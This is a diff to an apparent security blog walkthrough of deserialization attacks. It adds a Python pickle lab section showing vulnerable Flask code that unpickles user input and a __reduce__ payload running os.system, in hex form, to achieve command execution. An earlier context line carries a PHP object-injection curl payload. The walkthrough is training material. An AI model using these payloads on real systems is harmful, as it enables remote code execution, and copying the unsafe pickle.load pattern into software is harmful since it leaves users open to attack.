@@ -6,8 +6,6 @@ categories: [Web Pentesting, Deserialization]
 tags: [Web Pentesting, Deserialization]
 ---
 
-# Deserializing the Deserialization Attacks
-
 I was solving one of the active box in HTB where I encountered some interesting Deserialization vulnerability. Although I managed to solve the box, I was more curious about the exploitation of deserialization vulnerability in different languages. Therefore this blog contains the walkthrough for deserialization attacks on Java, PHP, Python and Node.
 
 The walkthrough is based on the lab https://github.com/NotSoSecure/NotSoCereal-Lab
@@ -290,3 +288,92 @@ curl -XPOST -d 'ippsec=O:4:"User":2:{s:8:"username";O:8:"ReadFile":1:{s:8:"filen
 ```
 
 ![image](https://user-images.githubusercontent.com/47778874/226169753-325de553-5a63-4582-861d-185de72f8f4b.png)
+
+## Lab Demonstration
+Let's move to the practical lab walkthrough now. Yes, we are yet to start the practical lab.
+### NotSoCereal-Lab: A Deserialization exploit playground
+As talked above, it contains lab for Java, PHP, Python, Node. Also, you can find the [lab deployment guide here](https://github.com/NotSoSecure/NotSoCereal-Lab/blob/main/Resources/Deployment/deployment.md). Follow the guide for a deployment. We will start here after that.
+
+The lab was supposed to be based on the link above but the virtual machine for the box has been removed. I will explore the machine once it is accessible.
+
+I have found another docker image for python deserialiazation attack lab https://github.com/blabla1337/skf-labs/tree/master/python/DES-Pickle
+### Deserialization on Python
+- Clone the repository https://github.com/blabla1337/skf-labs.git
+    ```bash
+    git clone https://github.com/blabla1337/skf-labs.git
+    ```
+- Navigate to `skf-labs/python/Des-Pickle`
+    ```bash
+    cd skf-labs/python/Des-Pickle
+    
+    # Recommending to remove exploit.py file inorder to avoid the spoiler.
+    
+    # Install the requirements
+    pip3 install -r requirements.txt
+    
+    # And run the python file.
+    python3 DES-Pickle.py
+    
+    # Navigate to 127.0.0.1:5000 on a browser.
+    ```
+- Open the URL on the browser, we can see a simple web page with a input field. 
+![image](https://user-images.githubusercontent.com/47778874/226195441-78b18d71-ebaf-4d5c-8dcc-f9309495b68a.png)
+
+- Intercept the request on burp and send some random text. It looks like the application sends POST request to **/sync** and the body parameter is **data_obj**
+![image](https://user-images.githubusercontent.com/47778874/226195588-b3c6f568-cdf0-4a50-adb8-de3decb0b5fe.png)
+
+- Lets view the source code **DES-Pickle.py**<br>
+```python
+@app.route("/sync", methods=['POST'])
+def deserialization():
+        with open("pickle.hacker", "wb+") as file:
+            att = request.form['data_obj']
+            attack = bytes.fromhex(att)
+            file.write(attack)
+            file.close()
+        with open('pickle.hacker', 'rb') as handle:
+            a = pickle.load(handle)
+            print(attack)
+            return render_template("index.html", content = a)
+```
+- Viewing the source code we can find that when POST request is performed on /sync path, a method deserialization() is triggered. The method stores the value obtained from data_obj parameter and save it to pickle.handler. And then it deserializes the data from picke.handler file using pickle.load method and renders the output in an HTML file.
+- In order to exploit it, we need to create a serialize data. Pickle allows different objects to declare how they should be pickled using the **__reduce__** method. Whenever an object is pickled, the **__reduce__** method defined by it gets called. This method returns either a string, which may represent the name of a Python global, or a tuple describing how to reconstruct this object when unpickling.
+
+- In the below code we are just defining a class test123 which contains the **__reduce__method**, it returns a tuple. And then an object is built which calls the os.system and will execute the command passed on the tuple.
+```python
+import os
+import pickle
+
+class test123():
+	def __reduce__(self):
+		return (os.system, ('sleep 5',))
+
+data123 = pickle.dumps(test123())
+print(data123)
+```
+- Running the code we can have
+```bash
+python3 deseee.py
+b'\x80\x04\x95"\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x07sleep 5\x94\x85\x94R\x94.'
+```
+- Since the application DES-Pickle.py have bytes.fromhex() method implemented, we need to convert the above binary into hex. We can do it using binascii.hexlify(). It makes our final payload as
+```python3
+import os
+import pickle
+import binascii
+
+class test123():
+	def __reduce__(self):
+		return (os.system, ('sleep 5',))
+
+data123 = pickle.dumps(test123())
+print(binascii.hexlify(data123)
+```
+- Run the code again.
+```bash
+python3 descee.py
+b'80049522000000000000008c05706f736978948c0673797374656d9493948c07736c656570203594859452942e'
+```
+- Copy only the hexadecimal value and submit the request again. Since we have told the application to sleep for 5 seconds, it will respond after 5 seconds indicating the command execution on it. 
+
+![image](https://user-images.githubusercontent.com/47778874/226198194-da71f745-bbea-4e76-a9ac-935187a69c3e.png)
